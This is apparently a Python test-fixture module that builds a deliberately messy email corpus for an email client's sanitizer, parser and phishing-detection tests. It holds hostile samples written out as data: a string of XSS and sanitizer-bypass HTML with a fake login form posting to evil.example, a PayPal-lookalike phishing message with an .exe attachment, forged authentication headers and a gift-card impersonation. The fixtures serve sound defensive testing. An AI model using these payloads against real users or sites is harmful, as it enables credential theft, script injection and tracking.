"""A deliberately messy email corpus: broken encodings, hostile HTML, huge
threads, duplicate Message-IDs, phishing, odd MIME. Used by the test suite,
`manage.py seed_test_mailbox` (dev GreenMail) and `manage.py demo`.

All addresses use reserved .test/.example domains (plus a few lookalikes of
real brands for the phishing cases).
"""

from __future__ import annotations

import base64
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from email.utils import format_datetime

ME = "me@manifest.test"
AUTHSERV = "mx.manifest.test"
BASE = datetime(2026, 10, 1, 9, 0, tzinfo=timezone.utc)


@dataclass
class Item:
    name: str
    raw: bytes
    folder: str = "INBOX"
    flags: list[str] = field(default_factory=list)
    date: datetime = BASE


def _d(i: float) -> datetime:
    return BASE + timedelta(hours=i)


def _hdr(date: datetime) -> str:
    return format_datetime(date)


def msg(headers: list[tuple[str, str]], body: str | bytes, *, ctype="text/plain; charset=utf-8",
        cte="8bit", auth: str | None = "pass") -> bytes:
    lines = []
    if auth:
        lines.append(f"Authentication-Results: {AUTHSERV}; spf={auth} smtp.mailfrom=x; dkim={auth} header.d=x; dmarc={auth} header.from=x")
        lines.append("Received: from mail.sender.test by mx.manifest.test; Thu, 1 Oct 2026 09:00:00 +0000")
    for k, v in headers:
        lines.append(f"{k}: {v}")
    if ctype:
        lines.append("MIME-Version: 1.0")
        lines.append(f"Content-Type: {ctype}")
        lines.append(f"Content-Transfer-Encoding: {cte}")
    head = "\r\n".join(lines).encode("utf-8")
    b = body if isinstance(body, bytes) else body.encode("utf-8")
    return head + b"\r\n\r\n" + b


def simple(i, frm, subject, body, *, to=ME, msgid=None, extra=(), auth="pass", date=None):
    date = date or _d(i)
    h = [("From", frm), ("To", to), ("Subject", subject), ("Date", _hdr(date)),
         ("Message-ID", msgid or f"<m{i}@sender.test>"), *extra]
    return msg(h, body, auth=auth)


HOSTILE_HTML = """<html><head><title>should vanish</title>
<meta http-equiv="refresh" content="0;url=https://evil.example/">
<base href="https://evil.example/">
<link rel="stylesheet" href="https://evil.example/track.css">
<style>
@import url("https://evil.example/import.css");
body { background: url(https://evil.example/bg.png); color: #222 }
.x { width: expression(alert(1)); behavior: url(x.htc); -moz-binding: url(x.xml#x) }
</style>
<script>alert('script tag')</script>
</head>
<body onload="alert('onload')">
<h1>Hostile HTML test</h1>
<p>Normal paragraph with <b>bold</b> and <a href="https://safe.example/page">a safe link</a>.</p>
<img src="https://tracker.example/pixel.gif?id=123" width="1" height="1">
<img src="x" onerror="alert('onerror')">
<img srcset="https://tracker.example/a.png 1x" src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">
<a href="javascript:alert('js link')">js link</a>
<a href="JaVaScRiPt:alert(1)">mixed case js</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data link</a>
<a href="vbscript:msgbox(1)">vb</a>
<a href="/relative/path">relative</a>
<iframe src="https://evil.example/frame"></iframe>
<object data="https://evil.example/x.swf"></object>
<embed src="https://evil.example/x.swf">
<form action="https://evil.example/steal" method="post"><input name="password" type="password"><button>Log in</button></form>
<svg><script>alert('svg script')</script><foreignObject><img src=x onerror=alert(2)></foreignObject></svg>
<math><mtext><table><mglyph><style><img src=x onerror=alert('mxss')></style></mglyph></table></mtext></math>
<noscript><p title="</noscript><img src=x onerror=alert('noscript')>"></p></noscript>
<div style="background-image:url('https://tracker.example/bg2.png');position:fixed;top:0">fixed div</div>
<p style="color:red" onclick="alert('click')" onmouseover="alert('hover')">handlers</p>
<table background="https://tracker.example/tbg.png"><tr><td>cell</td></tr></table>
<template><img src=x onerror=alert('template')></template>
<details open ontoggle="alert('toggle')"><summary>details</summary>x</details>
<a href="https://safe.example" target="_self" rel="opener">opener link</a>
<!-- <img src=x onerror=alert('comment')> -->
</body></html>"""


def build() -> list[Item]:
    items: list[Item] = []
    add = items.append

    # 1. Plain message.
    add(Item("plain", simple(0, "Alice Example <alice@friends.test>", "Lunch on Friday?",
                             "Hi!\n\nAre we still on for lunch on Friday?\n\nhttps://maps.example/place\n\n-- Alice"),
             date=_d(0)))

    # 2. RFC 2047 encoded subject + quoted-printable body.
    add(Item("rfc2047", msg(
        [("From", "=?UTF-8?B?SsO2cmcgTcO8bGxlcg==?= <joerg@friends.test>"), ("To", ME),
         ("Subject", "=?utf-8?q?Gr=C3=BC=C3=9Fe_aus_M=C3=BCnchen?= =?utf-8?b?IOKYgA==?="),
         ("Date", _hdr(_d(1))), ("Message-ID", "<qp1@friends.test>")],
        "Sch=C3=B6ne Gr=C3=BC=C3=9Fe =E2=80=94 J=C3=B6rg\r\nA very long line that is soft-=\r\nwrapped by QP.",
        cte="quoted-printable"), date=_d(1)))

    # 3. Declared latin-1, actually UTF-8.
    add(Item("mislabeled-latin1", msg(
        [("From", "Bob <bob@friends.test>"), ("To", ME), ("Subject", "Café menu"), ("Date", _hdr(_d(2))),
         ("Message-ID", "<ml1@friends.test>")],
        "Crème brûlée and café au lait — €4".encode("utf-8"), ctype="text/plain; charset=iso-8859-1"), date=_d(2)))

    # 4. Declared UTF-8, actually Windows-1252.
    add(Item("mislabeled-utf8", msg(
        [("From", "Carol <carol@work.test>"), ("To", ME), ("Subject", "Quotes"), ("Date", _hdr(_d(3))),
         ("Message-ID", "<ml2@work.test>")],
        "“Smart quotes” and – dashes …".encode("cp1252"), ctype="text/plain; charset=utf-8"),
        date=_d(3)))

    # 5. Unknown charset.
    add(Item("unknown-charset", msg(
        [("From", "Dan <dan@work.test>"), ("To", ME), ("Subject", "Weird charset"), ("Date", _hdr(_d(4))),
         ("Message-ID", "<uc1@work.test>")],
        "plain ascii with an \xe9 byte".encode("latin-1"), ctype="text/plain; charset=x-bogus-charset"), date=_d(4)))

    # 6. Raw 8-bit UTF-8 in headers.
    raw8 = ("Authentication-Results: mx.manifest.test; spf=pass; dkim=pass header.d=friends.test; dmarc=pass\r\n"
            "From: \"Jörg Müller\" <joerg@friends.test>\r\nTo: me@manifest.test\r\nSubject: Grüße — raw 8-bit\r\n"
            f"Date: {_hdr(_d(5))}\r\nMessage-ID: <raw8@friends.test>\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
            "Body with ümlauts.\r\n").encode("utf-8")
    add(Item("raw-8bit-utf8-headers", raw8, date=_d(5)))

    # 7. Raw Latin-1 in headers.
    raw_l1 = ("From: Ren\xe9 <rene@friends.test>\r\nTo: me@manifest.test\r\nSubject: R\xe9sum\xe9 attached\r\n"
              f"Date: {_hdr(_d(6))}\r\nMessage-ID: <rawl1@friends.test>\r\n\r\nNo content-type at all.\r\n").encode("latin-1")
    add(Item("raw-latin1-headers", raw_l1, date=_d(6)))

    # 8. Malformed encoded-word.
    add(Item("malformed-2047", msg(
        [("From", "=?utf-8?Q?Broken_Name <broken@friends.test>"), ("To", ME),
         ("Subject", "=?utf-8?B?SGVsbG8gV29y?= =?bogus?Q?x?= =?utf-8?Q?unterminated"),
         ("Date", _hdr(_d(7))), ("Message-ID", "<mf1@friends.test>")], "body"), date=_d(7)))

    # 9. Broken base64.
    add(Item("broken-base64", msg(
        [("From", "Eve <eve@friends.test>"), ("To", ME), ("Subject", "Broken base64"), ("Date", _hdr(_d(8))),
         ("Message-ID", "<b64@friends.test>")],
        "SGVsbG8gd29ybGQh\r\n!!!not base64***\r\nSGk", cte="base64"), date=_d(8)))

    # 10. Missing Message-ID, Date and From.
    add(Item("missing-headers", b"Subject: No headers to speak of\r\nTo: me@manifest.test\r\n\r\nWho sent this?\r\n",
             date=_d(9)))

    # 11. Garbage date.
    add(Item("garbage-date", simple(10, "Frank <frank@friends.test>", "Date from the future",
                                    "Date header is nonsense", extra=[("X-Note", "date junk")]).replace(
        _hdr(_d(10)).encode(), b"Tue, 99 Foo 31337 25:61:00 +9999"), date=_d(10)))

    # 12. Hostile HTML.
    add(Item("hostile-html", msg(
        [("From", "Newsletter <news@shop.test>"), ("To", ME), ("Subject", "Hostile HTML"), ("Date", _hdr(_d(11))),
         ("Message-ID", "<hostile@shop.test>")], HOSTILE_HTML, ctype="text/html; charset=utf-8"), date=_d(11)))

    # 13. Phishing: brand lookalike + Reply-To + DMARC fail + link mismatch + bad attachment.
    boundary = "phishbound"
    phish_body = (
        f"--{boundary}\r\nContent-Type: text/html; charset=utf-8\r\n\r\n"
        "<p>Your account is limited. <a href=\"http://198.51.100.7/login\">https://www.paypal.com/login</a></p>\r\n"
        f"--{boundary}\r\nContent-Type: application/octet-stream; name=\"invoice.pdf.exe\"\r\n"
        "Content-Disposition: attachment; filename=\"invoice.pdf.exe\"\r\nContent-Transfer-Encoding: base64\r\n\r\n"
        f"{base64.b64encode(b'MZ fake exe').decode()}\r\n--{boundary}--\r\n")
    add(Item("phish", msg(
        [("From", "PayPal Security <service@paypa1-secure.test>"), ("To", ME),
         ("Reply-To", "help@collector.example"), ("Return-Path", "<bounce@bulk.example>"),
         ("Subject", "Action required: your account is limited"), ("Date", _hdr(_d(12))),
         ("Message-ID", "<phish1@paypa1-secure.test>")],
        phish_body, ctype=f"multipart/mixed; boundary=\"{boundary}\"", cte="7bit", auth="fail"), date=_d(12)))

    # 14. Forged Authentication-Results below the provider's Received line.
    forged = (f"Authentication-Results: {AUTHSERV}; spf=fail smtp.mailfrom=bank.test; dkim=none; dmarc=fail header.from=bank.test\r\n"
              "Received: from evil.example by mx.manifest.test; Thu, 1 Oct 2026 09:00:00 +0000\r\n"
              f"Authentication-Results: {AUTHSERV}; spf=pass; dkim=pass header.d=bank.test; dmarc=pass header.from=bank.test\r\n"
              "From: Your Bank <security@bank.test>\r\nTo: me@manifest.test\r\nSubject: Verify your details\r\n"
              f"Date: {_hdr(_d(13))}\r\nMessage-ID: <forged@evil.example>\r\nContent-Type: text/plain\r\n\r\nClick here.\r\n").encode()
    add(Item("forged-auth-results", forged, date=_d(13)))

    # 15. Contacts: I wrote to Alice; she replied (In-Reply-To) - and a reply
    #     arriving BEFORE its parent (child first).
    add(Item("sent-to-alice", msg(
        [("From", f"Test Me <{ME}>"), ("To", "Alice Example <alice@friends.test>"), ("Subject", "Trip planning"),
         ("Date", _hdr(_d(14))), ("Message-ID", "<trip0@manifest.test>")], "Where should we go?", auth=None),
        folder="Sent", flags=["\\Seen"], date=_d(14)))
    add(Item("alice-reply-2", msg(
        [("From", "Alice Example <alice@friends.test>"), ("To", ME), ("Subject", "Re: Re: Trip planning"),
         ("Date", _hdr(_d(16))), ("Message-ID", "<trip2@friends.test>"),
         ("In-Reply-To", "<trip1@friends.test>"), ("References", "<trip0@manifest.test> <trip1@friends.test>")],
        "> Lisbon?\n\nYes, Lisbon it is!"), date=_d(16)))
    add(Item("alice-reply-1", msg(
        [("From", "Alice Example <alice@friends.test>"), ("To", ME), ("Subject", "Re: Trip planning"),
         ("Date", _hdr(_d(15))), ("Message-ID", "<trip1@friends.test>"), ("In-Reply-To", "<trip0@manifest.test>")],
        "How about Lisbon?"), date=_d(15)))

    # 16. Impersonation of a contact (same display name, different address).
    add(Item("contact-impersonation", simple(17, "Alice Example <alice.example.urgent@gmail.test>",
                                             "Quick favour", "Can you buy gift cards for me?"), date=_d(17)))

    # 17. Duplicate Message-IDs: different content, same ID.
    add(Item("dup-id-a", simple(18, "Greg <greg@work.test>", "Report v1", "First version",
                                msgid="<duplicate@work.test>"), date=_d(18)))
    add(Item("dup-id-b", simple(19, "Greg <greg@work.test>", "Report v2", "Second, different message, same ID",
                                msgid="<duplicate@work.test>"), date=_d(19)))
    # Identical bytes in two folders.
    same = simple(20, "Hana <hana@work.test>", "Filed copy", "This exact message is in Inbox and Archive.")
    add(Item("same-bytes-inbox", same, date=_d(20)))
    add(Item("same-bytes-archive", same, folder="Archive", date=_d(20)))

    # 18. Attachments: related HTML with cid image, RFC 2231 filename, forwarded message.
    png = base64.b64encode(
        bytes.fromhex("89504e470d0a1a0a0000000d4948445200000001000000010806000000"
                      "1f15c4890000000d49444154789c6360000002000154a24f5d0000000049454e44ae426082")).decode()
    inner = simple(0, "Original <orig@friends.test>", "The original", "Forwarded content").decode()
    rel = (
        "--outer\r\nContent-Type: multipart/related; boundary=\"rel\"\r\n\r\n"
        "--rel\r\nContent-Type: multipart/alternative; boundary=\"alt\"\r\n\r\n"
        "--alt\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nSee the logo.\r\n"
        "--alt\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<p>See the logo: <img src=\"cid:logo123@x\" alt=\"logo\"></p>\r\n"
        "--alt--\r\n"
        "--rel\r\nContent-Type: image/png\r\nContent-ID: <logo123@x>\r\nContent-Disposition: inline\r\n"
        f"Content-Transfer-Encoding: base64\r\n\r\n{png}\r\n--rel--\r\n"
        "--outer\r\nContent-Type: application/pdf\r\n"
        "Content-Disposition: attachment; filename*=UTF-8''%E2%82%AC%20rates%202026.pdf\r\n"
        f"Content-Transfer-Encoding: base64\r\n\r\n{base64.b64encode(b'%PDF-1.4 fake').decode()}\r\n"
        "--outer\r\nContent-Type: message/rfc822\r\nContent-Disposition: attachment\r\n\r\n"
        f"{inner}\r\n--outer--\r\n")
    add(Item("attachments", msg(
        [("From", "Ivan <ivan@work.test>"), ("To", ME), ("Subject", "Files for you"), ("Date", _hdr(_d(21))),
         ("Message-ID", "<att@work.test>")], rel, ctype="multipart/mixed; boundary=\"outer\"", cte="7bit"),
        date=_d(21)))

    # 18b. Photos as real attachments (for the image viewer).
    def png(w, h, rgb):
        import struct
        import zlib

        raw = b"".join(b"\x00" + bytes(rgb) * w for _ in range(h))
        def chunk(tag, data):
            return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)
        return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
                + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))
    photos = "".join(
        f"--ph\r\nContent-Type: image/png\r\nContent-Disposition: attachment; filename=\"{name}\"\r\n"
        f"Content-Transfer-Encoding: base64\r\n\r\n{base64.b64encode(png(320, 200, rgb)).decode()}\r\n"
        for name, rgb in (("harbour.png", (52, 110, 140)), ("sunset.png", (214, 120, 60)))
    )
    add(Item("photos", msg(
        [("From", "Alice Example <alice@friends.test>"), ("To", ME), ("Subject", "Holiday photos"),
         ("Date", _hdr(_d(21.5))), ("Message-ID", "<photos@friends.test>")],
        "--ph\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nTwo from the trip!\r\n" + photos + "--ph--\r\n",
        ctype="multipart/mixed; boundary=\"ph\"", cte="7bit"), date=_d(21.5)))

    # 18c. Files the web app previews: a PDF, an HTML page (with a script that
    # must never run), a CSV and a short audio clip.
    def tiny_pdf(text):
        objs = [b"<< /Type /Catalog /Pages 2 0 R >>",
                b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 420 200] /Contents 4 0 R "
                b"/Resources << /Font << /F1 5 0 R >> >> >>",
                None,
                b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
        stream = f"BT /F1 22 Tf 30 110 Td ({text}) Tj ET".encode()
        objs[3] = b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream"
        out, offsets = bytearray(b"%PDF-1.4\n"), []
        for i, body in enumerate(objs, 1):
            offsets.append(len(out))
            out += f"{i} 0 obj\n".encode() + body + b"\nendobj\n"
        xref = len(out)
        out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
        out += b"".join(f"{o:010d} 00000 n \n".encode() for o in offsets)
        out += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
        return bytes(out)

    def tone_wav(seconds=0.6, rate=8000, hz=440):
        import math
        import struct
        n = int(seconds * rate)
        pcm = bytes(int(128 + 90 * math.sin(2 * math.pi * hz * i / rate)) for i in range(n))
        return (b"RIFF" + struct.pack("<I", 36 + n) + b"WAVEfmt " + struct.pack("<IHHIIHH", 16, 1, 1, rate, rate, 1, 8)
                + b"data" + struct.pack("<I", n) + pcm)

    page = ("<!doctype html><html><head><title>Itinerary</title><style>h1{color:#2f4ad0}</style></head><body>"
            "<h1>Lisbon itinerary</h1><p>Day 1: Alfama walk.</p><img src=\"https://img.example/map.png\" alt=\"map\">"
            "<script>parent.document.title='pwned'</script></body></html>")
    files = [("itinerary.pdf", "application/pdf", tiny_pdf("Lisbon itinerary, day 1")),
             ("itinerary.html", "text/html; charset=utf-8", page.encode()),
             ("budget.csv", "text/csv", b"item,eur\nhotel,420\nfood,180\n"),
             ("voice note.wav", "application/octet-stream", tone_wav())]
    parts = "".join(
        f"--tf\r\nContent-Type: {ct}\r\nContent-Disposition: attachment; filename=\"{name}\"\r\n"
        f"Content-Transfer-Encoding: base64\r\n\r\n{base64.b64encode(data).decode()}\r\n"
        for name, ct, data in files
    )
    add(Item("trip-files", msg(
        [("From", "Alice Example <alice@friends.test>"), ("To", ME), ("Subject", "Trip files"),
         ("Date", _hdr(_d(21.7))), ("Message-ID", "<tripfiles@friends.test>")],
        "--tf\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nPlan, budget and a voice note.\r\n" + parts + "--tf--\r\n",
        ctype="multipart/mixed; boundary=\"tf\"", cte="7bit"), date=_d(21.7)))

    # 19. Pathologically nested multipart.
    depth = 60
    nested = "".join(f"--b{i}\r\nContent-Type: multipart/mixed; boundary=\"b{i + 1}\"\r\n\r\n" for i in range(depth))
    nested += f"--b{depth}\r\nContent-Type: text/plain\r\n\r\ndeep text\r\n--b{depth}--\r\n"
    nested += "".join(f"--b{i}--\r\n" for i in reversed(range(depth)))
    add(Item("deep-nesting", msg(
        [("From", "Deep <deep@friends.test>"), ("To", ME), ("Subject", "Deep MIME"), ("Date", _hdr(_d(22))),
         ("Message-ID", "<deep@friends.test>")], nested, ctype="multipart/mixed; boundary=\"b0\"", cte="7bit"),
        date=_d(22)))

    # 20. Control characters / NUL.
    add(Item("control-chars", simple(23, "Ctrl <ctrl@friends.test>", "Bell\x07 and tab\tsubject",
                                     "NUL\x00 in body and \x1b[31mANSI\x1b[0m"), date=_d(23)))

    # 21. Legit newsletter: return-path differs, DKIM passes.
    add(Item("newsletter", msg(
        [("From", "Weekly Digest <digest@news.shop.test>"), ("To", ME), ("Subject", "This week's picks"),
         ("Return-Path", "<bounces@esp.example>"), ("List-Unsubscribe", "<https://news.shop.test/unsub?u=1>"),
         ("Date", _hdr(_d(24))), ("Message-ID", "<digest@news.shop.test>")],
        "<p>Our picks for you</p><p><a href=\"https://news.shop.test/p/1\">Shop now</a></p>",
        ctype="text/html; charset=utf-8"), date=_d(24)))

    # 22. Subject-only threading (no References).
    add(Item("lunch-reply-noheaders", simple(25, "Alice Example <alice@friends.test>", "Re: Lunch on Friday?",
                                             "Sorry, forgot to reply. Yes!"), date=_d(25)))

    # 23. IDN homoglyph (Cyrillic "а" in apple).
    add(Item("idn-homoglyph", simple(26, "Apple <id@xn--pple-43d.com>", "Your Apple ID was locked",
                                     "Verify now."), date=_d(26)))

    # 24. Empty body, HTML-only, calendar.
    add(Item("empty", b"From: Empty <empty@friends.test>\r\nTo: me@manifest.test\r\nSubject: \r\n"
                      b"Message-ID: <empty@friends.test>\r\n\r\n", date=_d(27)))
    add(Item("calendar", msg(
        [("From", "Cal <cal@work.test>"), ("To", ME), ("Subject", "Invitation: Standup"), ("Date", _hdr(_d(28))),
         ("Message-ID", "<cal@work.test>")],
        "BEGIN:VCALENDAR\r\nVERSION:2.0\r\nBEGIN:VEVENT\r\nSUMMARY:Standup\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n",
        ctype="text/calendar; method=REQUEST; charset=utf-8; name=\"invite.ics\""), date=_d(28)))

    # 25. Spam that should be blocked later.
    add(Item("spam", simple(29, "Cheap Pills <deals@spammy.example>", "WIN BIG NOW!!!", "Buy now."), date=_d(29)))

    # 26. Shipping notifications (package tracking). HTML-only, several carriers,
    #     a later status update for the same number, and decoys that must not match.
    add(Item("ship-ups-shipped", msg(
        [("From", "Northwind Outfitters <orders@northwind.test>"), ("To", ME), ("Subject", "Your order #40019 has shipped!"),
         ("Date", _hdr(_d(156))), ("Message-ID", "<ship-ups-1@northwind.test>")],
        "<html><body><table><tr><td><h1>Good news &mdash; it&rsquo;s on its way</h1>"
        "<p>Your order <b>#40019</b> has shipped with UPS.</p>"
        "<p>Estimated delivery: <b>Thursday, November 19</b></p>"
        "<p>Tracking number: <a href=\"https://www.ups.com/track?tracknum=1Z999AA10123456784\">1Z999AA10123456784</a></p>"
        "<p>Order total: $84.20 &middot; Order number 40019-3381-2</p></td></tr></table></body></html>",
        ctype="text/html; charset=utf-8"), date=_d(156)))
    add(Item("ship-ups-delivered", msg(
        [("From", "UPS <mcinfo@ups.com>"), ("To", ME), ("Subject", "UPS Update: Package Delivered"),
         ("Date", _hdr(_d(157))), ("Message-ID", "<ship-ups-2@ups.com>")],
        "Your package has been delivered.\nTracking Number: 1Z999AA10123456784\nLeft at: Front Door\n"),
        date=_d(157)))
    add(Item("ship-usps-ofd", simple(158, "USPS <auto-reply@usps.com>", "USPS® Expected Delivery Today",
                                     "Your item is out for delivery on November 17, 2026 at 7:10 am.\n"
                                     "USPS Tracking® 9400 1112 0255 5842 3326 69 is not a number we can read with spaces,\n"
                                     "but this one is: 9400111202555842332669\n"), date=_d(158)))
    add(Item("ship-postnord", simple(159, "PostNord <noreply@postnord.se>", "Ditt paket kan hämtas",
                                     "Hej! Din försändelse RR123456785SE är redo att hämtas.\n"
                                     "Ditt paket kan hämtas hos ICA Nära Centrum.\n"), date=_d(159)))
    add(Item("ship-fedex", simple(160, "Shop <shop@gadgets.test>", "Your gadget is on the way",
                                  "We shipped your order via FedEx Ground.\nTracking: 986578788855\n"
                                  "Scheduled delivery: Monday\n"), date=_d(160)))
    add(Item("ship-amazon", simple(161, "Amazon.com <shipment-tracking@amazon.com>", "Shipped: \"USB-C cable\" and 1 more item",
                                   "Your package is on the way. Arriving tomorrow.\nTrack package: TBA312345678901\n"
                                   "Order # 112-4839201-2938475\n"), date=_d(161)))
    add(Item("ship-decoy-order", simple(162, "Bakery <hello@bakery.test>", "Order confirmed: 2 sourdough loaves",
                                        "Thanks for your order 123456789012! Pick up Saturday.\n"
                                        "Reference 1Z999AA10123456785 (not a real tracking number).\n"), date=_d(162)))
    add(Item("ship-decoy-fedex", simple(163, "Colleague <bob@work.test>", "FedEx invoice question",
                                        "Can you check FedEx invoice 123456789012 against PO 4410? No package involved.\n"),
             date=_d(163)))

    # 27. Huge thread (shuffled delivery order).
    items.extend(huge_thread(200))
    return items


def huge_thread(n: int, seed: int = 7) -> list[Item]:
    rng = random.Random(seed)
    out = []
    ids = [f"<huge{i}@list.test>" for i in range(n)]
    for i in range(n):
        refs = " ".join(ids[max(0, i - 40):i])
        h = [("From", f"Person {i % 9} <p{i % 9}@list.test>"), ("To", "list@list.test"),
             ("Subject", "Re: [list] The never-ending thread" if i else "[list] The never-ending thread"),
             ("Date", _hdr(_d(100 + i * 0.25))), ("Message-ID", ids[i])]
        if i:
            h += [("In-Reply-To", ids[i - 1]), ("References", refs)]
        out.append(Item(f"huge-{i}", msg(h, f"Message number {i}"), date=_d(100 + i * 0.25)))
    rng.shuffle(out)
    return out


def by_name() -> dict[str, Item]:
    return {i.name: i for i in build()}
